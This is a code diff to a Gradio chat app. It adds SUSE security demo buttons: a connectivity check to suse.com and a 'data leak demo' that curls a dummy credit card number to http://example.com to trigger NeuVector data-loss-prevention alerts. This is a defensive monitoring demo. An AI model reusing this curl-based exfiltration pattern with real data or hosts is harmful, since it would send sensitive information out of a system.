@@ -666,6 +666,70 @@ class ChatInterface:
         else:
             return "🟢 HEALTHY - Service operating normally"
 
+    def run_availability_demo(self) -> tuple:
+        """Runs availability demo by curling an external website (SUSE security demo pattern)."""
+        try:
+            logger.info("Running availability demo - testing external connectivity")
+            
+            # Use curl command similar to the security demo script
+            cmd = [
+                "curl", "-Is", "--connect-timeout", "5", "-m", "5", "https://suse.com"
+            ]
+            
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
+            
+            if result.returncode == 0:
+                message = f"✅ Availability Demo: Successfully connected to https://suse.com\n\nResponse Headers:\n{result.stdout[:500]}..."
+                status = "success"
+            else:
+                message = f"⚠️ Availability Demo: Connection failed to https://suse.com\n\nError: {result.stderr}"
+                status = "warning"
+                
+            logger.info(f"Availability demo completed with status: {status}")
+            return gr.Column(visible=False), message, status
+            
+        except subprocess.TimeoutExpired:
+            logger.error("Availability demo timed out")
+            return gr.Column(visible=True), "❌ Availability Demo: Connection timed out after 10 seconds", "error"
+        except Exception as e:
+            logger.error(f"Availability demo failed: {e}")
+            return gr.Column(visible=True), f"❌ Availability Demo failed: {str(e)}", "error"
+
+    def run_data_leak_demo(self) -> tuple:
+        """Runs data leak demo by sending credit card data (SUSE security demo pattern)."""
+        try:
+            logger.info("Running data leak demo - simulating sensitive data transmission")
+            
+            # Use curl command with credit card data similar to the security demo script
+            credit_card_pattern = "3412-1234-1234-2222"
+            cmd = [
+                "curl", "--connect-timeout", "5", "-m", "5", 
+                "-d", f"creditcard={credit_card_pattern}", 
+                "http://example.com"
+            ]
+            
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
+            
+            # Always report this as a security concern regardless of HTTP response
+            message = f"🔒 Data Leak Demo: Transmitted credit card {credit_card_pattern} to http://example.com\n\n"
+            message += f"⚠️ SECURITY ALERT: This demonstrates data loss prevention (DLP) monitoring.\n"
+            message += f"SUSE NeuVector should detect and alert on this sensitive data transmission.\n\n"
+            
+            if result.returncode == 0:
+                message += f"HTTP Response: {result.stdout[:300]}..."
+            else:
+                message += f"Connection result: {result.stderr}"
+                
+            logger.warning(f"Data leak demo executed - credit card data sent for DLP testing")
+            return gr.Column(visible=False), message, "warning"
+            
+        except subprocess.TimeoutExpired:
+            logger.error("Data leak demo timed out")
+            return gr.Column(visible=True), "❌ Data Leak Demo: Connection timed out after 10 seconds", "error"
+        except Exception as e:
+            logger.error(f"Data leak demo failed: {e}")
+            return gr.Column(visible=True), f"❌ Data Leak Demo failed: {str(e)}", "error"
+
     def refresh_providers(self) -> gr.HTML:
         """Manually refreshes provider statuses and returns the HTML."""
         logger.info("Manual provider refresh triggered.")
@@ -1097,8 +1161,9 @@ def create_interface():
                 initial_status_html = chat_instance.get_provider_status_html()
                 provider_status_html = gr.HTML(value=initial_status_html)
                 refresh_providers_btn = gr.Button("🔄 Refresh", elem_classes="refresh-btn", size="sm")
-                # NEW: Service Health Simulation button
-                health_simulation_btn = gr.Button("🚨 Service Health Simulation", variant="secondary", size="sm")
+                # SUSE Security Demo buttons
+                availability_demo_btn = gr.Button("🌐 Availability Demo", variant="secondary", size="sm")
+                data_leak_demo_btn = gr.Button("🔒 Data Leak Demo", variant="secondary", size="sm")
 
             # CENTER PANEL - Chat Interface in Grouped Container (70%) 
             with gr.Column(scale=7):
@@ -1225,39 +1290,39 @@ def create_interface():
             
             # Automation controls and results moved to main screen for better UX
 
-        # Service Health Simulation Modal (initially hidden)
-        with gr.Column(visible=False) as service_health_modal:
+        # SUSE Security Demo Modal (initially hidden)
+        with gr.Column(visible=False) as security_demo_modal:
             with gr.Row():
-                gr.HTML("<h3 style='color: #73ba25; text-align: center;'>🚨 Service Health Simulation</h3>")
-                close_service_health_btn = gr.Button("✕", variant="secondary", size="sm", elem_classes="close-btn")
+                gr.HTML("<h3 style='color: #73ba25; text-align: center;'>🔒 SUSE Security Demos</h3>")
+                close_security_demo_btn = gr.Button("✕", variant="secondary", size="sm", elem_classes="close-btn")
             
             gr.HTML("""
             <div style='background: rgba(220, 53, 69, 0.1); border: 1px solid rgba(220, 53, 69, 0.3); border-radius: 8px; padding: 12px; margin: 10px 0;'>
                 <p style='color: #dc3545; margin: 0; font-size: 0.9em;'>
-                    🚨 <strong>Advanced Demo Feature:</strong> This simulates a real service failure by patching the deployment's 
-                    environment variables using kubectl. This triggers actual service health state changes that SUSE Observability can detect.
+                    🔒 <strong>SUSE Security Demonstration:</strong> These demos simulate real security scenarios that 
+                    SUSE NeuVector and SUSE Observability can detect and alert on.
                 </p>
             </div>
             """)
             
             gr.HTML("""
             <div style='background: rgba(115, 186, 37, 0.1); border: 1px solid rgba(115, 186, 37, 0.3); border-radius: 8px; padding: 12px; margin: 10px 0;'>
-                <p style='color: #73ba25; margin: 0 0 8px 0; font-weight: 600;'>ℹ️ How it works (Better Approach):</p>
+                <p style='color: #73ba25; margin: 0 0 8px 0; font-weight: 600;'>🔍 Security Demo Scenarios:</p>
                 <ul style='color: #a5d6a7; margin: 0; font-size: 0.85em; padding-left: 20px;'>
-                    <li><strong>Realistic Failure:</strong> Uses kubectl patch to change SERVICE_HEALTH_FAILURE from "false" to "true"</li>
-                    <li><strong>Actual Impact:</strong> Service health status changes to "DEVIATING" state</li>
-                    <li><strong>Observable:</strong> SUSE Observability can detect the deployment change and correlate with health degradation</li>
-                    <li><strong>Recovery:</strong> Use 'Restore Service Health' to patch the environment variable back to "false"</li>
+                    <li><strong>Availability Demo:</strong> Tests external connectivity to https://suse.com (network policy monitoring)</li>
+                    <li><strong>Data Leak Demo:</strong> Transmits credit card data to simulate data loss prevention (DLP) detection</li>
+                    <li><strong>Security Monitoring:</strong> SUSE NeuVector should detect and alert on sensitive data transmission</li>
+                    <li><strong>Observability:</strong> Network traffic and security events are monitored by SUSE security stack</li>
                 </ul>
             </div>
             """)
             
             with gr.Row():
-                simulate_failure_action_btn = gr.Button("🚨 Activate Failure Simulation", variant="stop")
-                restore_health_action_btn = gr.Button("🩹 Restore Service Health", variant="primary")
+                availability_action_btn = gr.Button("🌐 Run Availability Demo", variant="primary")
+                data_leak_action_btn = gr.Button("🔒 Run Data Leak Demo", variant="stop")
             
             # Status message display
-            service_health_status_msg = gr.HTML(value="")
+            security_demo_status_msg = gr.HTML(value="")
 
         # --- Event Handlers ---
         
@@ -1286,17 +1351,17 @@ def create_interface():
             """Hide the configuration panel."""
             return gr.Column(visible=False)
         
-        def show_service_health_modal():
-            """Show the service health simulation modal."""
+        def show_security_demo_modal():
+            """Show the security demo modal."""
             return gr.Column(visible=True)
         
-        def hide_service_health_modal():
-            """Hide the service health simulation modal."""
+        def hide_security_demo_modal():
+            """Hide the security demo modal."""
             return gr.Column(visible=False), ""
         
-        def simulate_service_failure():
-            """Simulate service failure using kubectl patch."""
-            modal_visible, message, status = chat_instance.simulate_service_failure()
+        def run_availability_demo():
+            """Run availability demo."""
+            modal_visible, message, status = chat_instance.run_availability_demo()
             
             # Create status message HTML based on status
             if status == "success":
@@ -1308,9 +1373,9 @@ def create_interface():
             
             return modal_visible, status_html
         
-        def restore_service_health():
-            """Restore service health using kubectl patch."""
-            modal_visible, message, status = chat_instance.restore_service_health()
+        def run_data_leak_demo():
+            """Run data leak demo."""
+            modal_visible, message, status = chat_instance.run_data_leak_demo()
             
             # Create status message HTML based on status
             if status == "success":
@@ -1331,11 +1396,12 @@ def create_interface():
         config_btn.click(show_config_panel, outputs=[config_panel])
         close_config_btn.click(hide_config_panel, outputs=[config_panel])
         
-        # Service health simulation modal handlers
-        health_simulation_btn.click(lambda: gr.Column(visible=True), outputs=[service_health_modal])
-        close_service_health_btn.click(lambda: (gr.Column(visible=False), ""), outputs=[service_health_modal, service_health_status_msg])
-        simulate_failure_action_btn.click(simulate_service_failure, outputs=[service_health_modal, service_health_status_msg])
-        restore_health_action_btn.click(restore_service_health, outputs=[service_health_modal, service_health_status_msg])
+        # Security demo modal handlers
+        availability_demo_btn.click(show_security_demo_modal, outputs=[security_demo_modal])
+        data_leak_demo_btn.click(show_security_demo_modal, outputs=[security_demo_modal])
+        close_security_demo_btn.click(hide_security_demo_modal, outputs=[security_demo_modal, security_demo_status_msg])
+        availability_action_btn.click(run_availability_demo, outputs=[security_demo_modal, security_demo_status_msg])
+        data_leak_action_btn.click(run_data_leak_demo, outputs=[security_demo_modal, security_demo_status_msg])
         
 
         def initial_load():
